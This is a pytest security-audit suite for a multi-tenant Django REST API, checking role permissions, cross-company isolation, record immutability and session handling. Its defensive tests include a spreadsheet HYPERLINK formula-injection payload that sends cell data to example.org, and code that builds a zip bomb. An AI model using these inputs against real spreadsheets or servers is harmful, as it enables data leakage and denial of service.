"""Whole-API security audit (P4 go-live review, D-108).

It walks every route of the API instead of testing views one by one, so a new view that forgets its
permission class, or opens a door to the wrong role, fails here before it reaches production.
"""

import re
from collections.abc import Iterator
from typing import Any

import pytest
from django.core.cache import cache
from django.urls import URLPattern, URLResolver, get_resolver
from rest_framework.permissions import AllowAny, IsAuthenticated
from rest_framework.test import APIClient

from apps.core.models import Role

from .factories import MembershipFactory, OrganizationFactory, UserFactory

pytestmark = pytest.mark.django_db

METHODS = ("get", "post", "put", "patch", "delete")
WRITES = ("post", "put", "patch", "delete")
# Nobody needs to be logged in: liveness, the CSRF cookie, the login itself and the public site (D-186).
PUBLIC = {
    "/api/v1/health",
    "/api/v1/health/stock-check",
    "/api/v1/auth/csrf",
    "/api/v1/auth/login",
    "/api/v1/site/catalog",
    "/api/v1/site/logo",
    "/api/v1/site/products/<int:product_id>/photo",
    "/api/v1/site/requests",
}
# Any logged-in session, whatever the role: leaving.
ANY_SESSION = {"/api/v1/auth/logout"}
OFFICE = (Role.OWNER, Role.MANAGER)


def _walk(patterns: Any, prefix: str = "") -> Iterator[tuple[str, Any]]:
    for entry in patterns:
        if isinstance(entry, URLResolver):
            yield from _walk(entry.url_patterns, prefix + str(entry.pattern))
        elif isinstance(entry, URLPattern):
            yield prefix + str(entry.pattern), entry.callback


def _view_class(callback: Any) -> Any:
    return getattr(callback, "cls", None) or getattr(callback, "view_class", None) or callback


def _concrete(route: str, number: int = 999999) -> str:
    route = re.sub(r"<(?:str|slug):\w+>", "x", route)
    return "/" + re.sub(r"<(?:int:)?\w+>", str(number), route)


def api_routes() -> list[tuple[str, str, Any]]:
    """(template, concrete path with an unknown id, view class) of every API route."""
    found = {
        (route, _concrete(route), _view_class(callback))
        for route, callback in _walk(get_resolver().url_patterns)
        if route.startswith("api/v1/")
    }
    return sorted(found, key=lambda item: item[0])


ROUTES = api_routes()


def allowed_methods(view: Any) -> list[str]:
    return [method for method in METHODS if hasattr(view, method)]


@pytest.fixture(autouse=True)
def _reset_throttles():
    cache.clear()


def client_for(role: Role, organization: Any = None) -> APIClient:
    membership = MembershipFactory.create(
        role=role, organization=organization or OrganizationFactory.create(), user=UserFactory.create()
    )
    client = APIClient()
    client.force_authenticate(membership.user)
    return client


def _is_driver_area(path: str, method: str) -> bool:
    """What a driver may reach (D-023, D-042, D-091): their own screens, the catalogue to sell, their truck and
    their assignments, and sales from the truck of the day. The views narrow these to the driver's own rows."""
    # Buying at the port (D-158): only a driver the owner lets buy; the one of this test may not. Any driver reads
    # their own purchases.
    if path.startswith(("/api/v1/my-suppliers", "/api/v1/my-purchase-costs")):
        return False
    if path.startswith("/api/v1/my-field-purchases") and method != "get":
        return False
    if path.startswith(("/api/v1/my-", "/api/v1/me/")) or path in {"/api/v1/me"}:
        return True
    # Any logged-in person's own profile and avatar, and reading a colleague's avatar picture (D-123).
    if path == "/api/v1/users/<int:user_id>/avatar" and method == "get":
        return True
    # The company logo: every member reads it (D-154); only owners and managers change it.
    if path == "/api/v1/organizations/<int:organization_id>/logo" and method == "get":
        return True
    reading = method == "get"
    if path.startswith(("/api/v1/categories", "/api/v1/products", "/api/v1/price-lists")):
        return reading
    if path.startswith(("/api/v1/trucks", "/api/v1/truck-assignments")):
        return reading or path.startswith("/api/v1/truck-assignments")
    if path.startswith("/api/v1/sales"):
        return reading or not path.endswith("/cancel")
    return False


# The owner's own money (D-060, D-061): managers and drivers are refused, the accountant only reads.
OWNER_MONEY = (
    "/api/v1/employees",
    "/api/v1/salary-",
    "/api/v1/lot-work-days",
    "/api/v1/lots/",
    "/api/v1/months",
    "/api/v1/partners/",
    "/api/v1/partnerships",
    "/api/v1/payroll-summary",
    # The owner's figures and reports (P7): the accountant reads them, a manager gets 403.
    "/api/v1/dashboard",
    "/api/v1/lot-figures",
    "/api/v1/reports/cash-flow",
    "/api/v1/reports/customer-balances",
    "/api/v1/reports/month-result",
    "/api/v1/reports/partners",
    "/api/v1/reports/supplier-balances",
    "/api/v1/reports/unpaid-salaries",
)


# Settings and cost templates only the owner changes: a manager reads them but gets 403 on a write.
OWNER_ONLY_WRITES = (
    "/api/v1/expense-categories",
    "/api/v1/cold-room-weights",
    "/api/v1/cold-room-shares",
    "/api/v1/recurring-costs",
    "/api/v1/finance-settings",
    "/api/v1/stock-settings",
)
# Loading the company's data (P4-T01, D-112) and managing other users (D-123): the owner alone.
OWNER_ONLY_AREA = ("/api/v1/imports", "/api/v1/members")
# The API map: owner and manager only.
OFFICE_ONLY = ("/api/v1/schema",)


def test_every_route_checks_a_role():
    """No view may rely on the default 'any logged-in user' permission: that would let a driver in."""
    loose = []
    for route, _, view in ROUTES:
        classes = list(getattr(view, "permission_classes", []))
        path = "/" + route.rstrip("/")
        if path in PUBLIC or path in ANY_SESSION:
            continue
        if not classes or any(c in (AllowAny, IsAuthenticated) for c in classes):
            loose.append((path, [c.__name__ for c in classes]))
            continue
    assert loose == []


def test_nobody_logged_out_gets_past_the_login():
    client = APIClient()
    for route, path, view in ROUTES:
        if "/" + route.rstrip("/") in PUBLIC:
            continue
        for method in allowed_methods(view):
            answer = getattr(client, method)(path)
            assert answer.status_code == 401, (method.upper(), path, answer.status_code)


@pytest.mark.parametrize("role", [Role.OWNER, Role.MANAGER, Role.ACCOUNTANT, Role.DRIVER])
def test_each_role_reaches_only_its_own_area(role):
    """A route a role must not use answers 403 before it looks at anything; the others never answer 5xx."""
    client = client_for(role)
    wrong = []
    for route, path, view in ROUTES:
        template = "/" + route.rstrip("/")
        if template in PUBLIC:
            continue
        for method in allowed_methods(view):
            answer = getattr(client, method)(path)
            forbidden = answer.status_code == 403
            should_forbid = _should_forbid(role, template, method)
            if answer.status_code >= 500:
                wrong.append((role, method.upper(), path, answer.status_code, "server error"))
            elif forbidden != should_forbid:
                wrong.append(
                    (role, method.upper(), path, answer.status_code, "expected 403" if should_forbid else "allowed")
                )
    assert not wrong, "\n".join(map(str, wrong))


def _should_forbid(role: Role, path: str, method: str) -> bool:
    if path in ANY_SESSION:
        return False
    if role == Role.DRIVER:
        return not _is_driver_area(path, method)
    if path.startswith("/api/v1/my-"):
        return True  # the driver's own screens
    if path.startswith(OWNER_ONLY_AREA):
        return role != Role.OWNER
    if role == Role.ACCOUNTANT:
        # The accountant reads everything office; the only things they write are their own language and the
        # review of a month (D-060).
        if path in OFFICE_ONLY:
            return True
        if path == "/api/v1/me" or path.startswith("/api/v1/me/") or path.endswith("/review"):
            return False
        return method in WRITES
    if role == Role.MANAGER:
        return path.startswith(OWNER_MONEY) or (
            method in WRITES and path.startswith(OWNER_ONLY_WRITES) and not path.endswith("/generate")
        )
    return False


# ---- Tenancy (D-022) and the driver's own data, on a fully seeded company ----

SEED_PASSWORD = "test-password-123"
# A route's first ids come from the list of its collection; these collections are named differently.
COLLECTION = {
    "lots": "batches",
    "partners": "suppliers",
    "supplier-balances": "suppliers",
    "stock/products": "products",
    "withholding-certificates": None,
    "documents": None,
}
DOCUMENT_COLLECTIONS = {
    "quote": "quotes",
    "invoice": "invoices",
    "credit_note": "credit-notes",
    "receipt": "customer-payments",
}


def _rows(payload: Any) -> list[dict[str, Any]]:
    if isinstance(payload, dict) and isinstance(payload.get("results"), list):
        return list(payload["results"])
    return list(payload) if isinstance(payload, list) else []


def _ids(client: APIClient, collection: str | None, cache_: dict[str, list[int]]) -> list[int]:
    if collection is None:
        return []
    if collection not in cache_:
        answer = client.get(f"/api/v1/{collection}", {"limit": 100})
        rows = _rows(answer.json()) if answer.status_code == 200 else []
        cache_[collection] = [row["id"] for row in rows if isinstance(row, dict) and isinstance(row.get("id"), int)][:4]
    return cache_[collection]


def _collection_of(template: str) -> str | None:
    head = re.split(r"/<int:", template.removeprefix("api/v1/"))[0]
    return COLLECTION.get(head, head) if head else None


def _snapshot(organization: Any) -> dict[str, str]:
    """Every row of the company, as text: the sweep must leave it exactly as it was."""
    from django.apps import apps
    from django.core import serializers

    state = {}
    for model in apps.get_models():
        if model._meta.app_label.startswith(("auth", "contenttypes", "sessions", "admin")):
            continue
        if any(field.name == "organization" for field in model._meta.get_fields()):
            rows = model._default_manager.filter(organization=organization).order_by("pk")
            state[model.__name__] = serializers.serialize("json", rows)
    return state


@pytest.fixture
def seeded_company(db, settings):
    from django.core.management import call_command

    from apps.core.models import Organization

    call_command("seed_dev", password=SEED_PASSWORD, verbosity=0)
    return Organization.objects.get(name="Frutti Del Mare")


def _login(username: str) -> APIClient:
    from apps.core.models import User

    client = APIClient()
    client.force_authenticate(User.objects.get(username=username))
    return client


def test_another_company_sees_and_changes_nothing_of_this_one(seeded_company):
    """Every route, asked by the owner of ANOTHER company with the real ids of this one: never a row, never a
    change (D-022). The same ids answer for the real owner, so the check is not an empty test."""
    owner = _login("owner")
    other = client_for(Role.OWNER)
    ids: dict[str, list[int]] = {}
    before = _snapshot(seeded_company)
    leaks: list[Any] = []
    checked = 0
    for route, _, view in ROUTES:
        if "/" + route.rstrip("/") in PUBLIC | ANY_SESSION or "/<int:" not in route:
            continue
        found = _ids(owner, _collection_of(route), ids)
        for number in found[:2]:
            path = _concrete(route, number)
            for method in allowed_methods(view):
                answer = getattr(other, method)(path, {} if method != "get" else None, format="json")
                checked += 1
                if answer.status_code < 400 or answer.status_code >= 500:
                    leaks.append((method.upper(), path, answer.status_code))
    assert checked > 100
    assert leaks == []
    assert _snapshot(seeded_company) == before


# Lists that are never empty for a new company, and none of them holds the other company's rows: the expense
# categories, the banks (D-197) and the treasury accounts (D-219) every company gets by default, its own member list,
# and the calendar of the last twelve months.
OWN_DEFAULTS = {
    "/api/v1/expense-categories",
    "/api/v1/treasury/banks",
    "/api/v1/treasury/accounts",
    "/api/v1/members",
    "/api/v1/months",
}


def test_another_company_gets_empty_lists(seeded_company):
    owner = _login("owner")
    other = client_for(Role.OWNER)
    full = 0
    leaks = []
    for route, path, view in ROUTES:
        if (
            "<" in route
            or route.endswith("schema")
            or "/" + route.rstrip("/") in PUBLIC | ANY_SESSION
            or not hasattr(view, "get")
        ):
            continue
        if path in OWN_DEFAULTS:
            continue
        mine = owner.get(path)
        theirs = other.get(path)
        if mine.status_code != 200 or theirs.status_code != 200:
            continue
        if not mine["Content-Type"].startswith("application/json"):
            continue  # a file download (the Excel templates), not a list
        shown = _rows(mine.json())
        if not shown:
            continue
        full += 1
        if _rows(theirs.json()):
            leaks.append((path, len(_rows(theirs.json()))))
    assert full > 20
    assert not leaks, str(leaks)


def test_documents_of_another_company_are_not_served(seeded_company):
    owner = _login("owner")
    other = client_for(Role.OWNER)
    ids: dict[str, list[int]] = {}
    served = 0
    for kind, collection in DOCUMENT_COLLECTIONS.items():
        for number in _ids(owner, collection, ids)[:2]:
            served += 1
            assert other.get(f"/api/v1/documents/{kind}/{number}/pdf").status_code == 404, (kind, number)
    assert served > 0


def test_a_driver_sees_only_their_own_day(seeded_company):
    """A second driver of the same company, with no truck, gets nothing of the first driver's day."""
    from apps.core import services as core_services

    second = core_services.create_user(username="driver2", password=SEED_PASSWORD, first_name="Autre", last_name="C.")
    core_services.add_member(organization=seeded_company, user=second, role=Role.DRIVER)
    first, other = _login("driver"), _login("driver2")
    trucks = _ids(_login("owner"), "trucks", {})
    sales_of_first = _ids(first, "sales", {})
    assert trucks
    assert sales_of_first

    assert [row["id"] for row in _rows(other.get("/api/v1/trucks").json())] == []
    assert [row["id"] for row in _rows(other.get("/api/v1/sales").json())] == []
    assert [row["id"] for row in _rows(other.get("/api/v1/truck-assignments").json())] == []
    for truck in trucks:
        assert other.get(f"/api/v1/trucks/{truck}").status_code in {403, 404}
    for sale in sales_of_first:
        assert other.get(f"/api/v1/sales/{sale}").status_code == 404
        assert other.post(f"/api/v1/sales/{sale}/confirm", {}, format="json").status_code in {403, 404, 400}
    for path in ("my-day", "my-truck-day", "my-stock", "my-day-closing", "my-day-summary", "my-expenses", "my-losses"):
        mine, theirs = first.get(f"/api/v1/{path}"), other.get(f"/api/v1/{path}")
        assert theirs.status_code in {200, 404, 400, 405}, (path, theirs.status_code)
        if mine.status_code == 200 and theirs.status_code == 200 and _rows(mine.json()):
            assert _rows(theirs.json()) == [] or theirs.json() != mine.json(), path


def test_a_driver_cannot_change_trucks_once_the_day_is_open(seeded_company):
    """The open day, its sales and its closing stay on one truck: swapping or dropping the assignment mid-day
    would let the driver sell from another truck than the one their cash and stock are counted on (D-046)."""
    from django.utils import timezone

    from apps.fleet.models import TruckAssignment

    driver = _login("driver")
    today = timezone.localdate()
    mine = TruckAssignment.objects.get(organization=seeded_company, driver__username="driver", date=today)
    other_truck = next(t for t in _ids(_login("owner"), "trucks", {}) if t != mine.truck_id)

    # The office sets the starting cash first; the driver accepts it (D-203).
    owner = _login("owner")
    fund = {"driver": mine.driver_id, "date": today.isoformat(), "opening_cash": "50.000"}
    assert owner.put("/api/v1/day-funds", fund, format="json").status_code == 200
    assert driver.post("/api/v1/my-day", format="json").status_code == 201

    swap = driver.post("/api/v1/truck-assignments", {"truck": other_truck}, format="json")
    assert swap.status_code in {400, 403}, swap.status_code
    drop = driver.delete(f"/api/v1/truck-assignments/{mine.pk}")
    assert drop.status_code in {400, 403}, drop.status_code
    mine.refresh_from_db()
    assert mine.truck_id != other_truck


def _first(client: APIClient, path: str, **match: Any) -> dict[str, Any]:
    rows = _rows(client.get(f"/api/v1/{path}", {"limit": 100}).json())
    return next(row for row in rows if all(row.get(key) == value for key, value in match.items()))


def test_approved_and_posted_records_cannot_be_changed_through_the_api(seeded_company):
    """Approved expenses, bills, salaries, posted invoices and validated transfers are history: a PUT, PATCH or
    DELETE with a perfectly valid body is refused, and nothing in the company changes (rule 7)."""
    owner = _login("owner")
    expense = _first(owner, "expenses", status="approved", day_labour_id=None)
    labour = _first(owner, "day-labour", status="approved")
    bill = _first(owner, "electricity-bills", status="approved")
    cost = _first(owner, "general-costs", status="approved")
    salary = _first(owner, "salary-records", status="approved")
    transfer = _first(owner, "transfers", status="validated")
    invoice = _first(owner, "supplier-invoices", status="partly_paid")
    expense_body = {
        "spent_on": expense["spent_on"],
        "category": expense["category"]["id"],
        "amount": "999.000",
        "description": "changed",
    }
    cases = [
        ("put", f"expenses/{expense['id']}", expense_body),
        ("delete", f"expenses/{expense['id']}", None),
        ("post", f"expenses/{expense['id']}/reject", {"reason": "late"}),
        (
            "put",
            f"day-labour/{labour['id']}",
            {"labourer": labour["labourer"]["id"], "worked_on": labour["worked_on"], "amount": "999.000"},
        ),
        ("delete", f"day-labour/{labour['id']}", None),
        ("put", f"electricity-bills/{bill['id']}", {"month": bill["month"], "amount": "999.000"}),
        ("delete", f"electricity-bills/{bill['id']}", None),
        (
            "put",
            f"general-costs/{cost['id']}",
            {
                "spent_on": cost["spent_on"],
                "category": cost["category"]["id"],
                "amount": "999.000",
                "first_month": cost["first_month"],
            },
        ),
        ("delete", f"general-costs/{cost['id']}", None),
        ("patch", f"salary-records/{salary['id']}", {"bonus": "999.000"}),
        ("delete", f"salary-records/{salary['id']}", None),
        (
            "put",
            f"transfers/{transfer['id']}",
            {
                "from_location": transfer["from_location"]["id"],
                "to_location": transfer["to_location"]["id"],
                "transferred_on": transfer["transferred_on"],
                "lines": [],
            },
        ),
        (
            "put",
            f"supplier-invoices/{invoice['id']}",
            {"invoice_date": invoice["invoice_date"], "due_date": invoice["due_date"], "receipts": []},
        ),
        ("delete", f"supplier-invoices/{invoice['id']}", None),
    ]
    before = _snapshot(seeded_company)
    accepted = []
    for method, path, body in cases:
        answer = getattr(owner, method)(f"/api/v1/{path}", body, format="json")
        if answer.status_code < 400 or answer.status_code >= 500:
            accepted.append((method.upper(), path, answer.status_code))
    assert not accepted, str(accepted)
    assert _snapshot(seeded_company) == before


# ---- P4-T05 follow-up (D-141): holes found after D-108, each closed with its test ----


def _member(organization: Any, role: Role, username: str) -> Any:
    return MembershipFactory.create(role=role, organization=organization, user=UserFactory.create(username=username))


def _as(membership: Any) -> APIClient:
    client = APIClient()
    client.force_authenticate(membership.user)
    return client


def test_a_driver_cannot_take_the_truck_another_driver_started_the_day_on():
    """Driver A starts the day on their usual truck (no assignment needed). Driver B then "chose" that truck for
    the day: A was locked out of their own truck mid-day and B sold A's stock (D-141). Only the office moves it."""
    from django.utils import timezone

    from apps.fleet import selectors as fleet
    from apps.fleet import services as fleet_services

    company = OrganizationFactory.create()
    owner = _member(company, Role.OWNER, "patron")
    first = _member(company, Role.DRIVER, "ali")
    second = _member(company, Role.DRIVER, "sami")
    truck = fleet_services.create_truck(
        organization=company, actor=None, name="Camion A", plate="1 TU 1", driver=first.user
    )
    fleet_services.create_truck(organization=company, actor=None, name="Camion B", plate="2 TU 2", driver=second.user)

    fund = {"driver": first.user.pk, "date": timezone.localdate().isoformat(), "opening_cash": "20.000"}
    assert _as(owner).put("/api/v1/day-funds", fund, format="json").status_code == 200  # D-203
    assert _as(first).post("/api/v1/my-day", format="json").status_code == 201

    taken = _as(second).post("/api/v1/truck-assignments", {"truck": truck.pk}, format="json")
    assert taken.status_code == 400, taken.status_code
    assert "truck" in taken.json()
    mine = fleet.truck_of_driver(first)
    theirs = fleet.truck_of_driver(second)
    assert mine is not None
    assert mine.pk == truck.pk
    assert theirs is None or theirs.pk != truck.pk

    # The office still decides: it may give the truck to the other driver.
    moved = _as(owner).post("/api/v1/truck-assignments", {"truck": truck.pk, "driver": second.user.pk}, format="json")
    assert moved.status_code == 201


def test_names_in_excel_exports_stay_text_never_formulas():
    """A driver names themselves (or a manager names a customer) "=HYPERLINK(...)": the owner's Excel export must
    show that text, not run it as a formula (D-141)."""
    import io
    from decimal import Decimal

    from openpyxl import load_workbook

    from apps.reports.exports import workbook_bytes

    payload = '=HYPERLINK("http://example.org/?"&B2,"Ali")'
    content = workbook_bytes(
        title="Ventes",
        headers=["Libellé", "Montant"],
        rows=[[payload, Decimal("12.500")], ["=1+1", Decimal("1.000")]],
        totals=["Total", Decimal("13.500")],
    )
    sheet = load_workbook(io.BytesIO(content)).active
    assert sheet is not None
    assert sheet["A2"].value == payload
    assert sheet["A2"].data_type == "s"
    assert sheet["A3"].data_type == "s"
    assert sheet["B2"].data_type == "n"


def test_old_password_guesses_are_limited():
    """A session left open on a shared computer must not let someone find the password by trying (D-141)."""
    client = _as(_member(OrganizationFactory.create(), Role.MANAGER, "gerant"))
    answers = [
        client.post(
            "/api/v1/me/password", {"old_password": f"guess-{n}", "new_password": "Tres-long-mot-2026"}, format="json"
        ).status_code
        for n in range(10)
    ]
    assert answers[:8] == [400] * 8
    assert set(answers[8:]) == {429}


def _session_of(username: str) -> APIClient:
    client = APIClient()
    assert client.login(username=username, password="test-password")
    assert client.get("/api/v1/me").status_code == 200
    return client


def test_a_deactivated_member_is_logged_out_at_once():
    """Their open sessions (a phone left logged in) stop working on the next request (D-123, D-141)."""
    company = OrganizationFactory.create()
    owner = _member(company, Role.OWNER, "patronne")
    driver = _member(company, Role.DRIVER, "parti")
    phone = _session_of("parti")

    assert _as(owner).post(f"/api/v1/members/{driver.pk}/deactivate").status_code == 200
    assert phone.get("/api/v1/me").status_code == 401
    assert phone.get("/api/v1/my-stock").status_code == 401


def test_a_password_reset_by_the_owner_ends_the_member_sessions():
    company = OrganizationFactory.create()
    owner = _member(company, Role.OWNER, "patron2")
    manager = _member(company, Role.MANAGER, "oublie")
    browser = _session_of("oublie")

    reset = _as(owner).post(
        f"/api/v1/members/{manager.pk}/reset-password", {"new_password": "Nouveau-mot-2026"}, format="json"
    )
    assert reset.status_code == 204
    assert browser.get("/api/v1/me").status_code == 401


def test_the_import_refuses_a_zip_bomb():
    """An .xlsx is a zip: a few MB sent may unpack to gigabytes in the server's memory (D-141)."""
    import io
    import zipfile

    from apps.dataimport import services as imports

    owner = _member(OrganizationFactory.create(), Role.OWNER, "chargeur")
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("[Content_Types].xml", "<Types/>")
        with archive.open("xl/sharedStrings.xml", "w", force_zip64=True) as member:
            chunk = b"\0" * (1024 * 1024)
            for _ in range(101):
                member.write(chunk)
    assert len(buffer.getvalue()) < 5 * 1024 * 1024
    with pytest.raises(imports.WorkbookError, match="décompressé"):
        imports.run_import(
            organization=owner.organization,
            actor=owner.user,
            kind_key="suppliers",
            content=buffer.getvalue(),
            dry_run=True,
        )


def test_ids_of_another_company_in_a_request_body_are_unknown(seeded_company):
    """D-022 for ids sent in the body, not the address: another company's customer, product, place, truck, driver
    or sale is refused on that field, and nothing of either company changes."""
    from apps.core import services as core_services
    from apps.core.models import User

    owner = _login("owner")
    customer = _ids(owner, "customers", {})[0]
    product = _ids(owner, "products", {})[0]
    location = _ids(owner, "locations", {})[0]
    truck = _ids(owner, "trucks", {})[0]
    sale = _ids(owner, "sales", {})[0]
    driver = User.objects.get(username="driver").pk
    other_company = OrganizationFactory.create()
    other = client_for(Role.OWNER, other_company)
    stranger = core_services.create_user(username="etranger", password=SEED_PASSWORD)
    core_services.add_member(organization=other_company, user=stranger, role=Role.DRIVER)
    line = {"product": product, "quantity": "1.000", "unit_price": "1.000"}
    cases = [
        (
            "sales",
            {
                "client_uuid": "6f1d1b8e-5d0c-4a59-9a8e-3d7d1f2c0a11",
                "customer": customer,
                "location": location,
                "lines": [line],
            },
            {"customer", "location", "lines.0.product"},
        ),
        ("quotes", {"quoted_on": "2026-10-14", "customer": customer, "lines": [line]}, {"customer", "lines.0.product"}),
        (
            "transfers",
            {"from_location": location, "to_location": location, "transferred_on": "2026-10-14", "lines": [line]},
            {"from_location", "to_location", "lines.0.product"},
        ),
        (
            "losses",
            {
                "lost_on": "2026-10-14",
                "location": location,
                "product": product,
                "quantity": "1.000",
                "reason": "spoiled",
            },
            {"location", "product"},
        ),
        ("invoices", {"sales": [sale]}, {"sales"}),
        ("truck-assignments", {"truck": truck, "driver": stranger.pk}, {"truck"}),
        ("trucks", {"name": "Pris", "plate": "9 TU 9", "driver": driver}, {"driver"}),
    ]
    before = _snapshot(seeded_company)
    wrong = []
    for path, body, fields in cases:
        answer = other.post(f"/api/v1/{path}", body, format="json")
        named = set(answer.json()) if answer.status_code == 400 else set()
        if answer.status_code != 400 or not named & fields:
            wrong.append((path, answer.status_code, answer.content[:300]))
    assert not wrong, "\n".join(map(str, wrong))
    assert _snapshot(seeded_company) == before
